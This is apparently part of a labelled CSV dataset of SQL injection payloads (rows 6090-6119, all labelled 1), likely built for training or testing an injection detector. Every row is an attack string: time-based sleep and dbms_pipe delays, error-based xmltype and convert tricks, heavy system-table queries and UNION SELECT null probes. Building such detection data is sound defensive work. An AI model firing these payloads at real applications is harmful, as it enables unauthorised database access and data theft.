row_index,payload_norm,label,sqli_type_hint
6090,"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""hdis"" like ""hdis",1,
6091,"1' ) as woka where 4316 = 4316 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
6092,"1' ) union all select null,null--",1,
6093,1' where 6359 = 6359 and ( 3020 = 3020 ) *6703--,1,
6094,-2733' ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 'btjx' = 'btjx,1,
6095,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( '%' = '",1,
6096,1' ) where 8118 = 8118,1,
6097,"1%' ) ) and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6098,"1 ) ) as npdl where 5796 = 5796 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
6099,"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )",1,
6100,"iif ( 9007 = 3836,1,1/0 )",1,
6101,"select * from generate_series ( 7237,7237,case when ( 7237 = 9757 ) then 1 else 0 end ) limit 1--",1,
6102,1' ) where 1369 = 1369 and 4840 = 1697#,1,
6103,1 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # odvp,1,
6104,1 where 4245 = 4245,1,
6105,1 ) ) as xlww where 5844 = 5844,1,
6106,select ( case when ( 5704 = 4125 ) then 5704 else cast ( 1 as int ) / ( select 0 from dual ) end ) from dual--,1,
6107,1' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,1,
6108,"1%"" ) order by 1--",1,
6109,"1 union all select null,null,null,null,null,null,null,null,null#",1,
6110,"1"" ) where 8953 = 8953 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
6111,"1' in boolean mode ) or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) #",1,
6112,"-1737' or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'fsmd' = 'fsmd",1,
6113,"1'+ ( select lang where 4191 = 4191 union all select null,null#",1,
6114,1%' ) ) union all select null--,1,
6115,end and ( ( ( '%' = ',1,
6116,1'|| ( select 'ifts' from dual where 6329 = 6329,1,
6117,"1' ) ) as nuku where 7009 = 7009 union all select null,null,null,null,null#",1,
6118,"select * from generate_series ( 3180,3180,case when ( 3180 = 4445 ) then 1 else 0 end ) limit 1--",1,
6119,"1 ) ) union all select null,null,null,null,null,null#",1,
